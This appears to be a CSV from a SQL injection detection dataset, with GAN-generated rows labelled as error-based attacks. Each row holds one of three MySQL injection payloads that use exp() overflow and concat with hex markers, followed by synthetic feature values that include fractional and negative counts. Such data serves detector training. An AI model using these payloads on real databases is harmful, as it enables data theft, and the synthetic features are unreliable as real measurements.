id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000057,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,4.910586010867543,253.58116149902344,70.91553497314453,32.67457962036133,95.38739013671875,1.9819190502166748,74.3702621459961,37.259056091308594,0.9907543659210205,0.31391116976737976,0.14655914902687073,0.3859136402606964,0.12703005969524384,3.7946512699127197,1.1774576902389526,1.0396915674209595,0.7653919458389282,0.1717952936887741,0.14547540247440338,0.002791713923215866,8.286505699157715,8.764124870300293,2.608004570007324,0.045379217714071274,1.630456805229187,0.1390366107225418,-0.0638291984796524,-0.06049928441643715,0.18009716272354126,0.49948400259017944,-0.034951187670230865,-0.08735917508602142,1.422668218612671,0.08341923356056213,0.47112637758255005,1.725311040878296,6.902569770812988,0.8457865715026855,2.1451168060302734,0.2158631533384323,0.42599785327911377,0.949794352054596,-0.04338984191417694,0.22022858262062073,0.056751444935798645,-0.10506433993577957,-0.08467046171426773,0.327843576669693,0.3610017001628876,0.3881194591522217,0.15555042028427124,0.25789815187454224,-0.055087387561798096,-0.006509605795145035,0.09888255596160889,0.00902655627578497,0.04541994631290436,0.056023549288511276,0.04975849390029907,0.12666255235671997,-0.11929108947515488,-0.001535370945930481,-0.04325859248638153,-0.03431309759616852,0.32094046473503113,-0.10842476040124893,0.48440101742744446,0.18027758598327637,0.05929355323314667,0.10816890001296997,-0.016555070877075195,-0.08749490231275558,0.13704469799995422,0.13475020229816437,0.05987925827503204,0.010350133292376995,1.013649582862854,0.25634339451789856,-0.06345368921756744,0.1155712679028511,0.17251364886760712,7.435379505157471,0.698701024055481,0.13667333126068115,0.13128353655338287,0.5874596834182739,0.10394582897424698,-0.002956230193376541,-0.01681753247976303
GAN_000058,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000196,5.132252325614281,246.046630859375,73.81375885009766,32.79401779174805,97.01934814453125,6.336792469024658,74.79825592041016,39.152320861816406,1.1858561038970947,0.29200297594070435,0.14408303797245026,0.3803383708000183,0.12408644706010818,3.771817684173584,1.0803688764572144,1.0040255784988403,0.9002184271812439,0.1442742496728897,0.14452333748340607,0.06897030025720596,9.120085716247559,8.56260871887207,2.970104694366455,0.04876265302300453,1.5358024835586548,0.1506326049566269,0.01711248606443405,-0.030867567285895348,0.14067435264587402,0.5431989431381226,-0.1031554788351059,-0.04464959353208542,1.29643976688385,0.2068893313407898,0.4995127022266388,1.820596694946289,6.3458685874938965,0.5010598301887512,1.9565898180007935,0.07073405385017395,0.5915600657463074,1.1287583112716675,-0.03952472656965256,0.13642901182174683,0.13303284347057343,-0.028061382472515106,-0.27868837118148804,0.36044585704803467,0.409085214138031,0.4126048982143402,0.04036175087094307,0.2845497131347656,-0.12284287810325623,0.07491523772478104,0.16705496609210968,-0.0018624095246195793,0.03497611731290817,0.00024830177426338196,0.2152009755373001,0.08138050884008408,-0.02144453674554825,0.27532607316970825,-0.011557824909687042,-0.12406317889690399,0.3056434392929077,0.0055054835975170135,0.44548630714416504,0.07212898880243301,0.19747816026210785,-0.021267913281917572,-0.18349257111549377,-0.2152320146560669,-0.015722081065177917,0.04085461050271988,0.05206591635942459,0.01281723566353321,1.079074740409851,0.1983836144208908,-0.11177986860275269,-0.005652120802551508,0.13864238560199738,7.193782806396484,0.7692400813102722,0.19828541576862335,0.03259601816534996,0.5398229956626892,-0.09185834228992462,0.23305028676986694,0.05644197762012482
GAN_000059,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,4.890459844309674,245.0107879638672,71.16204071044922,33.56147766113281,90.81341552734375,5.867372035980225,71.90071105957031,34.80965805053711,0.98554527759552,0.3243253231048584,0.1501326709985733,0.3835127651691437,0.12690143287181854,3.79105281829834,1.0651288032531738,0.6976974010467529,0.6283560991287231,0.18811970949172974,0.12110460549592972,0.08099999278783798,7.729986667633057,8.62427043914795,2.505488157272339,0.08245982229709625,1.676695704460144,0.14212651550769806,-0.16018083691596985,0.011083530262112617,0.18281273543834686,0.4470028579235077,0.041860148310661316,-0.22344158589839935,1.4056243896484375,0.0016994588077068329,0.3867124319076538,1.8736858367919922,7.266973972320557,0.8811202645301819,1.915934681892395,0.16317594051361084,0.40344077348709106,0.9261857867240906,0.04188784584403038,0.2070382833480835,0.03898991644382477,-0.09422049671411514,-0.09694266319274902,0.35926175117492676,0.3297940790653229,0.34516504406929016,0.2909872829914093,0.2332429140806198,-0.11249805986881256,0.05784085392951965,0.15814146399497986,0.012945503927767277,0.025480858981609344,0.0941237360239029,-0.05997375398874283,0.12867465615272522,-0.08363110572099686,-0.09054961800575256,-0.05200454592704773,0.1648828685283661,0.31226468086242676,-0.0017991289496421814,0.4929063022136688,0.10101873427629471,0.09923619031906128,0.07194171100854874,0.07420068979263306,-0.07813522964715958,0.07599090784788132,0.04458530247211456,0.04864572361111641,0.013084382750093937,0.9361780285835266,0.27355077862739563,-0.05165378749370575,0.1727515608072281,0.21692302823066711,7.64517879486084,0.6263991594314575,0.16029752790927887,0.18610000610351562,0.5580136775970459,-0.058236561715602875,-0.14968560636043549,-0.13347932696342468
GAN_000060,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.377259569643049,241.97129821777344,68.7480239868164,32.365665435791016,95.6906509399414,2.6084249019622803,82.28167724609375,45.25190353393555,1.399612545967102,0.25646737217903137,0.14909051358699799,0.3796199560165405,0.12339659780263901,3.7249624729156494,1.1173229217529297,1.251734733581543,0.8988817930221558,0.26333317160606384,0.11825406551361084,0.0786520466208458,9.427180290222168,7.784372329711914,2.640491008758545,-0.03981460630893707,1.5454908609390259,0.14082758128643036,-0.07625753432512283,-0.09026322513818741,0.06522002816200256,0.6633744239807129,-0.006648421287536621,-0.02257724106311798,1.2831997871398926,0.4117874205112457,0.5636277794837952,1.9858882427215576,5.757309913635254,0.0891319140791893,2.004260540008545,0.14468899369239807,0.6829015016555786,1.2555731534957886,-0.09221994876861572,0.11463018506765366,0.29272234439849854,0.010425984859466553,-0.3749414086341858,0.3360757529735565,0.40276652574539185,0.4736827611923218,-0.1585703045129776,0.2821223735809326,-0.1905357390642166,0.08567269891500473,0.15486568212509155,-0.0193121749907732,0.01751362904906273,0.07875919342041016,0.3291940689086914,0.053828876465559006,-0.05001387000083923,0.5350351333618164,-0.008028626441955566,-0.06653273850679398,0.32867008447647095,-0.026371529325842857,0.5000435709953308,0.19218942523002625,0.22016233205795288,-0.15423493087291718,-0.2017417550086975,-0.13684342801570892,0.08461393415927887,0.33326250314712524,0.06693783402442932,0.023732440546154976,1.1880367994308472,0.1283460110425949,-0.3030874729156494,-0.05208008736371994,0.11044316738843918,7.486874103546143,0.8548911809921265,0.25420016050338745,-0.05222231522202492,0.5201212763786316,-0.11287213861942291,0.5205671191215515,-0.02421022206544876
GAN_000061,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.1359040248690775,249.08309936523438,68.51739501953125,33.15066146850586,97.45233917236328,0.7211096882820129,78.00973510742188,39.92252731323242,1.1976754665374756,0.29031357169151306,0.15788938105106354,0.3864579200744629,0.1263541281223297,3.728502035140991,1.0058952569961548,1.1886589527130127,0.8824446797370911,0.2371642142534256,0.13508740067481995,0.2575575113296509,8.440930366516113,8.419085502624512,2.571772575378418,-0.01410406082868576,1.516239881515503,0.16581739485263824,-0.16944089531898499,-0.06242739036679268,0.16111694276332855,0.49463996291160583,-0.051010578870773315,-0.07815499603748322,1.314495325088501,0.13684242963790894,0.4520581066608429,1.8249142169952393,6.558040142059326,0.5536229610443115,2.014446973800659,0.19915905594825745,0.43779367208480835,1.007564902305603,-0.16113510727882385,0.20054924488067627,0.22487764060497284,-0.1644660234451294,-0.16851688921451569,0.42962414026260376,0.37441155314445496,0.3926028311252594,0.06679465621709824,0.2007499635219574,-0.11554870009422302,0.1031072810292244,0.10049159079790115,-0.0017864955589175224,0.06063203513622284,0.19181516766548157,0.08389073610305786,0.022389162331819534,-0.02226606011390686,0.005384758114814758,-0.19069133698940277,-0.004779797047376633,0.40770798921585083,-0.025810319930315018,0.4756353199481964,0.26200032234191895,0.1489776372909546,0.10389840602874756,-0.06864769011735916,-0.1949828714132309,-0.06710342317819595,0.16394366323947906,0.09137104451656342,0.016094086691737175,1.146386981010437,0.21250805258750916,-0.09601743519306183,0.07304253429174423,0.20308391749858856,6.76212215423584,0.7445600628852844,0.20380541682243347,0.009579028934240341,0.5750971436500549,0.016012027859687805,0.0771801769733429,-0.24633845686912537
GAN_000062,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000196,5.1475936402813165,245.90753173828125,70.36477661132812,32.049285888671875,96.76416778564453,5.946458339691162,79.0517578125,36.76459884643555,0.9020429849624634,0.305012583732605,0.14179277420043945,0.3840573728084564,0.12310045212507248,3.792757987976074,0.9662734866142273,0.9760070443153381,0.7218466401100159,0.13201741874217987,0.14550437033176422,-0.05954095721244812,8.144701957702637,9.175063133239746,2.3949685096740723,0.11505337059497833,1.61663019657135,0.14075148105621338,-0.1214936375617981,-0.057940009981393814,0.15454939007759094,0.4562445282936096,0.0030025169253349304,-0.03411684185266495,1.3040118217468262,0.00604880228638649,0.5110388398170471,1.755476474761963,6.587317943572998,0.832446277141571,1.9718326330184937,0.13461622595787048,0.4851033389568329,1.052444338798523,-0.25308114290237427,0.2011616826057434,0.017696917057037354,-0.06342323869466782,-0.18531334400177002,0.3608309030532837,0.36726462841033936,0.4158458113670349,0.18315228819847107,0.25656577944755554,-0.1789330691099167,0.14884546399116516,0.17661228775978088,0.01468508131802082,0.003714944701641798,0.05055483803153038,0.18504981696605682,0.14963918924331665,-0.04377571493387222,0.24362508952617645,-0.05890768766403198,-0.05408645421266556,0.3346537947654724,-0.0524885393679142,0.4006977379322052,0.22597035765647888,0.13544334471225739,0.028555020689964294,-0.08183465152978897,-0.05003287270665169,0.2094784677028656,0.11690127849578857,0.044355109333992004,0.005536846816539764,1.0122816562652588,0.24781623482704163,0.021721575409173965,0.0074407546781003475,0.14690817892551422,6.944498538970947,0.7644376754760742,0.17246587574481964,0.09911773353815079,0.5210872888565063,0.08668815344572067,0.07848484814167023,0.16796442866325378
GAN_000063,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,4.861249446371863,243.37164306640625,73.80968475341797,33.69597244262695,90.22037506103516,5.563170433044434,71.5268783569336,36.99687194824219,1.2622915506362915,0.3118583559989929,0.14494089782238007,0.38410136103630066,0.1259785294532776,3.7600467205047607,1.1446657180786133,0.8060532212257385,0.7874011397361755,0.18808488547801971,0.11750885099172592,-0.0023594507947564125,8.624066352844238,8.369488716125488,2.5450339317321777,0.11245621740818024,1.6312255859375,0.14157572388648987,0.06630439311265945,0.007800454273819923,0.15708352625370026,0.4627046287059784,0.013220999389886856,-0.07007230818271637,1.4136217832565308,0.2181107997894287,0.4434206187725067,1.9017975330352783,6.640453815460205,0.6616687178611755,2.0379245281219482,0.15787985920906067,0.5255410075187683,0.9835069179534912,0.14829549193382263,0.17428642511367798,0.12354008853435516,-0.07932937890291214,-0.19144272804260254,0.33079013228416443,0.3373227119445801,0.34717410802841187,0.15415123105049133,0.2721109390258789,-0.16684561967849731,0.08770104497671127,0.1664908230304718,0.00442996621131897,0.06296584010124207,0.0019996166229248047,-0.02909570187330246,0.14244024455547333,-0.07583538442850113,0.09093552827835083,-0.003223702311515808,-0.06874178349971771,0.37876617908477783,0.053973302245140076,0.5445488095283508,0.03494244068861008,0.0607236810028553,-0.08826731145381927,-0.00730016827583313,-0.26122593879699707,-0.0814734473824501,0.046565160155296326,0.04832753911614418,0.017371531575918198,0.925306499004364,0.22769419848918915,-0.07503567636013031,0.101140096783638,0.1377805471420288,7.590365886688232,0.638077974319458,0.1602327674627304,0.09842085093259811,0.5725340247154236,-0.15590810775756836,-0.030249353498220444,-0.04138634353876114
GAN_000064,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.127462816031042,240.6868896484375,71.15843200683594,33.03209686279297,97.68901062011719,6.6710920333862305,77.63615417480469,40.133724212646484,1.064396619796753,0.28947654366493225,0.15076467394828796,0.3883622884750366,0.12344706058502197,3.737527370452881,0.8873152136802673,1.121265172958374,0.9575179219245911,0.19364255666732788,0.1900072991847992,0.15387782454490662,7.999462604522705,9.024968147277832,2.74837327003479,0.0887790396809578,1.4650566577911377,0.18024100363254547,-0.03984741121530533,-0.04926103726029396,0.20443418622016907,0.5517650246620178,-0.09990394115447998,-0.03534287214279175,1.3252642154693604,0.17212209105491638,0.5358707308769226,1.864553689956665,6.46947717666626,0.6361250281333923,1.9126417636871338,0.01815350539982319,0.5180807113647461,1.08086097240448,-0.1684865802526474,0.18449929356575012,0.1263275444507599,-0.16185224056243896,-0.22559970617294312,0.4086022675037384,0.44098690152168274,0.38584059476852417,0.05569668486714363,0.15488001704216003,-0.0980072021484375,0.22603628039360046,0.14302635192871094,0.00850363727658987,0.04110186547040939,0.1571306586265564,0.08395817875862122,-0.047687336802482605,0.12404078245162964,0.054822228848934174,-0.1594429761171341,-0.07456706464290619,0.3663468658924103,-0.15380898118019104,0.4327792525291443,0.11117241531610489,0.21206320822238922,0.08038689941167831,-0.09273377805948257,-0.20994552969932556,-0.08033973723649979,0.21160897612571716,0.06652466952800751,0.0066912295296788216,1.2866063117980957,0.19359351694583893,-0.06819723546504974,0.0004945187247358263,0.12185613811016083,6.738193511962891,0.7217377424240112,0.19352209568023682,0.024194326251745224,0.5460144877433777,0.0903255045413971,0.04806509241461754,-0.044352397322654724
GAN_000065,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.156132147069,248.2819061279297,61.4267692565918,33.767574310302734,94.32588195800781,3.8679444789886475,83.5536117553711,38.4722785949707,0.8020282983779907,0.2928173840045929,0.14742429554462433,0.38857683539390564,0.12348128855228424,3.7573907375335693,0.8511402010917664,1.0986610651016235,0.7728371620178223,0.226064071059227,0.14719220995903015,-0.08601666241884232,8.462668418884277,9.780519485473633,2.1410160064697266,0.09611233323812485,1.665954828262329,0.19229990243911743,-0.1016315147280693,-0.04334611818194389,0.2408558875322342,0.5119063258171082,-0.05369803309440613,-0.12183074653148651,1.5182358026504517,-0.031980112195014954,0.467451274394989,2.0377695560455322,7.154242038726807,0.9621139168739319,2.10219669342041,0.13600243628025055,0.4996081590652466,1.0642956495285034,-0.13433511555194855,0.19337663054466248,0.2690897583961487,-0.13535767793655396,-0.057818703353405,0.3672274053096771,0.40894386172294617,0.4726811945438385,0.15115436911582947,0.17909324169158936,-0.08748456835746765,0.20338758826255798,0.13695457577705383,0.009846876375377178,0.046435270458459854,0.23724843561649323,-0.07546085119247437,0.18191209435462952,0.1470724195241928,0.005120567977428436,-0.22806112468242645,-0.036228738725185394,0.42847904562950134,-0.10971629619598389,0.4615204632282257,0.21116048097610474,0.013658307492733002,0.08180467784404755,-0.07047607749700546,-0.08649694174528122,0.1319839060306549,-0.004027634859085083,0.05982569232583046,0.011790424585342407,1.1596288681030273,0.26049569249153137,-0.014890849590301514,0.12743763625621796,0.15243873000144958,7.674692153930664,0.7086099982261658,0.17057561874389648,0.11863911151885986,0.5343340635299683,0.058094412088394165,-0.06355002522468567,0.16725078225135803
GAN_000066,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,5.07304411943998,242.2802734375,76.90467071533203,32.3858642578125,89.58222198486328,6.324090003967285,70.63390350341797,40.67890167236328,1.1706968545913696,0.29384589195251465,0.15164276957511902,0.38423535227775574,0.12430446594953537,3.7302424907684326,1.1142908334732056,0.9677111506462097,1.005094051361084,0.14995424449443817,0.1753043532371521,0.089486263692379,8.444077491760254,8.490504264831543,3.112525701522827,0.03297644481062889,1.489155888557434,0.13469897210597992,-0.002406415995210409,-0.02028157375752926,0.1821957230567932,0.5210756659507751,-0.14894360303878784,0.012724034488201141,1.329040765762329,0.3477313816547394,0.571708083152771,1.9285130500793457,6.0892133712768555,0.6186715364456177,1.981302261352539,0.028866859152913094,0.5484939217567444,1.0564916133880615,-0.10099554061889648,0.13833115994930267,0.03365260362625122,-0.008202604949474335,-0.22191937267780304,0.3680287301540375,0.4073845446109772,0.35942772030830383,-0.007895509712398052,0.24731117486953735,-0.20248357951641083,0.12283133715391159,0.16279049217700958,0.015826672315597534,0.049242839217185974,0.12828578054904938,0.09586010873317719,0.049274593591690063,0.033272966742515564,0.16494590044021606,-0.03274090588092804,0.03895417973399162,0.3379836976528168,-0.0843861922621727,0.5498887300491333,-0.059694163501262665,0.1615140438079834,0.04924940690398216,0.009219024330377579,-0.35338854789733887,-0.0031335726380348206,0.07772095501422882,0.04763857275247574,0.00962468609213829,1.2489001750946045,0.2265600711107254,-0.11616349220275879,-0.02900034748017788,0.11916372925043106,6.705392360687256,0.7421528100967407,0.1997365802526474,0.0654686987400055,0.5840663313865662,-0.019837472587823868,0.06777709722518921,-0.04896015301346779
GAN_000067,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,4.97268743456036,237.69345092773438,69.3763198852539,32.8448486328125,92.86839294433594,2.6236603260040283,75.50786590576172,39.46609115600586,0.9631703495979309,0.3004741072654724,0.1419568508863449,0.3804118037223816,0.12671922147274017,3.7722036838531494,1.2869017124176025,0.8443009853363037,0.759165346622467,0.15882888436317444,0.10465747863054276,0.15059581398963928,8.729704856872559,8.567895889282227,2.7801671028137207,0.05509379506111145,1.5364645719528198,0.14169169962406158,-0.07821713387966156,-0.02031644992530346,0.13299186527729034,0.560283362865448,-0.0845247358083725,-0.18814265727996826,1.2779896259307861,0.17198523879051208,0.458766907453537,1.8738282918930054,6.567164421081543,0.614143967628479,2.030252695083618,0.1105024665594101,0.5624569654464722,1.1067780256271362,0.10143573582172394,0.1860036551952362,0.28948354721069336,0.0028693601489067078,-0.1612486094236374,0.40919893980026245,0.318406343460083,0.3968762159347534,0.14300519227981567,0.32978174090385437,-0.02572217583656311,0.022740289568901062,0.15346215665340424,-0.0023204637691378593,0.03905431181192398,-0.0009976029396057129,-0.03422888368368149,0.21342751383781433,-0.013060711324214935,0.11124296486377716,-0.12539437413215637,0.033522579818964005,0.3382505476474762,0.056593157351017,0.4288177192211151,0.17082861065864563,0.07423700392246246,-0.047328606247901917,-0.1257539987564087,-0.22599205374717712,0.057885926216840744,0.09556128084659576,0.04064119979739189,0.01452010590583086,1.0373739004135132,0.13803285360336304,-0.16397234797477722,0.07964291423559189,0.1509024202823639,7.452016353607178,0.7402698397636414,0.18639691174030304,0.03968201205134392,0.567352831363678,-0.10321792960166931,0.13676823675632477,-0.03550347685813904
GAN_000068,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.157397328683838,244.5322723388672,68.57471466064453,31.267484664916992,85.49176788330078,5.613455295562744,75.03717041015625,37.82294464111328,1.0067691802978516,0.31644031405448914,0.15149833261966705,0.3882335424423218,0.12320683151483536,3.777364730834961,0.778355598449707,0.9415953755378723,0.7728493809700012,0.19380033016204834,0.15986518561840057,0.032943692058324814,8.861456871032715,8.269674301147461,2.0648868083953857,0.07050992548465729,1.7069671154022217,0.1695115566253662,-0.012346942909061909,0.002367394044995308,0.35443705320358276,0.4040876626968384,0.06417933106422424,-0.15722407400608063,1.4308644533157349,0.045142266899347305,0.41128265857696533,1.9808528423309326,6.562098503112793,0.9660465121269226,2.1582601070404053,0.13792185485363007,0.49702969193458557,0.9438055753707886,0.13495425879955292,0.2651728093624115,0.14414264261722565,-0.23425355553627014,-0.05721719563007355,0.4394858181476593,0.3622075021266937,0.4014374315738678,0.29755470156669617,0.19300277531147003,-0.19787366688251495,0.07858292013406754,0.1371905356645584,0.02261025458574295,0.03636827692389488,0.13969583809375763,-0.23055106401443481,0.18852384388446808,0.07645316421985626,0.03527124971151352,-0.12880666553974152,0.05083485320210457,0.4776483476161957,0.01878610998392105,0.5292863845825195,0.1732223927974701,-0.0029863137751817703,-0.0643254816532135,0.06928718835115433,-0.3043102025985718,0.11133329570293427,-0.09899641573429108,0.04625836759805679,0.01649443618953228,0.9334900379180908,0.18486815690994263,-0.04735304415225983,0.16336901485919952,0.1376073658466339,7.065865516662598,0.6045702695846558,0.1540193408727646,0.10896439850330353,0.6513327360153198,-0.018223222345113754,-0.3156992793083191,-0.07203833758831024
GAN_000069,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R000297,4.888415976456787,243.3197784423828,68.47523498535156,33.66457748413086,91.27799987792969,1.803292989730835,78.16061401367188,41.556129455566406,1.0466156005859375,0.27801239490509033,0.15654848515987396,0.38022997975349426,0.1253257542848587,3.746894598007202,1.3287441730499268,0.8674522042274475,0.7904565334320068,0.25174087285995483,0.10600624978542328,0.1559322625398636,7.647603511810303,9.051376342773438,2.47458815574646,0.02497001737356186,1.4889559745788574,0.11218218505382538,-0.2997034788131714,-0.05091330036520958,0.13636186718940735,0.45858025550842285,-0.0051093026995658875,-0.015122056007385254,1.4688974618911743,0.328519731760025,0.540510892868042,1.8030929565429688,6.549504280090332,0.6186951994895935,1.8585437536239624,0.13777558505535126,0.44536635279655457,1.0678210258483887,-0.16506268084049225,0.15432459115982056,0.08723106980323792,0.03575176000595093,-0.07089777290821075,0.29341673851013184,0.3880576193332672,0.3680937886238098,0.04043575003743172,0.24140207469463348,-0.011509761214256287,-0.012817449867725372,0.08536868542432785,0.009542163461446762,0.04897138848900795,0.36073243618011475,0.014382123947143555,0.041791096329689026,-0.0786963403224945,0.07973651587963104,-0.014477580785751343,0.15171006321907043,0.34814947843551636,-0.08891555666923523,0.5532227754592896,0.03575799614191055,0.12382300198078156,0.04310581088066101,-0.06099601835012436,-0.1456693857908249,0.0885869711637497,0.32464152574539185,0.02867218106985092,0.018102889880537987,1.245362401008606,0.21106134355068207,-0.18805791437625885,0.08394306898117065,0.20154030621051788,7.42528772354126,0.7348105907440186,0.1982540786266327,0.055962350219488144,0.5523456335067749,0.03775419294834137,0.09370046854019165,-0.16640004515647888
GAN_000070,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000259,5.12241930361713,247.7003631591797,67.25929260253906,32.248722076416016,87.77755737304688,5.946292877197266,76.95492553710938,39.65235900878906,1.2089180946350098,0.29019540548324585,0.15176834166049957,0.3799418807029724,0.12671397626399994,3.75223445892334,0.971280038356781,0.7330003380775452,0.6802495121955872,0.21129177510738373,0.09091607481241226,-0.026015235111117363,8.625064849853516,7.9564900398254395,2.017374038696289,0.06818671524524689,1.6668463945388794,0.17085736989974976,-0.07464232295751572,-0.020776817575097084,0.12201228737831116,0.5303980112075806,0.07557555288076401,-0.11085473746061325,1.2251132726669312,0.20798346400260925,0.4098149240016937,1.9450703859329224,6.716147422790527,0.4534812867641449,1.8575785160064697,0.18088042736053467,0.5648539066314697,1.1050893068313599,0.11841835081577301,0.13492237031459808,0.26886409521102905,-0.06806587427854538,-0.21741075813770294,0.3325711488723755,0.30962225794792175,0.38677528500556946,0.09521844238042831,0.31623801589012146,-0.18458111584186554,0.1220465674996376,0.18752546608448029,0.0026083607226610184,0.0099577521905303,0.06084846332669258,0.05601207911968231,0.07832373678684235,-0.09275531023740768,0.24692271649837494,-0.005906403064727783,0.04601248726248741,0.36815157532691956,0.08921141177415848,0.48744985461235046,0.1916513442993164,0.09521470963954926,-0.1590343862771988,-0.06284668296575546,-0.17997676134109497,0.021808288991451263,0.11488678306341171,0.046789564192295074,0.022554997354745865,0.9437066316604614,0.15036271512508392,-0.2181103378534317,0.0818648487329483,0.19078513979911804,7.772833824157715,0.7474491596221924,0.19971449673175812,0.07010334730148315,0.5155850052833557,-0.15700459480285645,0.17564843595027924,-0.0614970400929451
